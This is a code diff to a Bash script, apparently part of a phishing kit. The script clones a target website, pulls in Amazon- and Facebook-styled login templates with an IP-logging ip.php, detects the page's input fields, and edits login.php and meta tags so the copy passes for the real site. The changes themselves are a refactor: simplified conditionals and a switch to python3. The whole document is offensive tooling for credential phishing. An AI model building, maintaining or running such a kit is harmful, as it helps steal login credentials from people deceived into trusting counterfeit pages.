@@ -28,44 +28,32 @@ fi
 if [[ -e "$carpeta/alert.js" ]];then
 rm -rf alert.js
 fi
-if [[ $si_clone == "si" ]];then
-absolutamentenada="lol"
-else
+if [[ $si_clone == "" ]];then
 sed -i "/<meta property='og:.*' content='.*'/d" ./$carpeta/index.html
 sed -i "/<script src='alert.js'/d" ./$carpeta/index.html
 fi
 }
 	
 archivos(){
-if [[ -d websites ]];then
-holaque="hace"
-else
+if [[ ! -d websites ]];then
 echo -e "$r[!]$b Ooops Eliminaste una carpeta:( > websites"
 exit 1
 fi
 
 if [[ -d clone ]];then
-if [[ -e "clone/index.php" ]];then
-skskskdk="ksksksk"
-else
+if [[ ! -e "clone/index.php" ]];then
 cp websites/amazon_es/index.php clone
 fi
 
-if [[ -e "clone/ip.php" ]];then
-skskskdk="ksksksk"
-else
+if [[ ! -e "clone/ip.php" ]];then
 cp websites/amazon_es/ip.php clone
 fi
 
-if [[ -e "clone/.bs4" ]];then
-skskskdk="ksksksk"
-else
+if [[ ! -e "clone/.bs4" ]];then
 cp websites/facebook_us/.bs4 clone
 fi
 
-if [[ -e "clone/.get" ]];then
-skskskdk="ksksksk"
-else
+if [[ ! -e "clone/.get" ]];then
 cp websites/facebook_us/.get clone
 fi
 
@@ -919,7 +907,7 @@ sed -i '2i '"$ogrede"'' $carpeta/login.php
 enpezar(){
 if [[ $si_clone == "si" ]];then
 echo -e "$v[*]$b Descargando sitio..."
-python clone/.get $clonada
+python3 clone/.get $clonada
 
 if [[ -f index.html ]];then
 ksoaolzodo="ksosod"
@@ -928,7 +916,7 @@ echo -e "$r[!]$b No se pudo descargar la pagina revisa tu conexión."
 exit 1
 fi
 echo -e "$v[*]$b Modificando archivos..."
-python clone/.bs4 $clonada > name.txt
+python3 clone/.bs4 $clonada > name.txt
 if [[ $(cat name.txt) == "" ]] || [[ $(cat name.txt) == "Error" ]]; then
 echo -e "$r[!]$b Cuidado, inputs no encontrados"
 fi
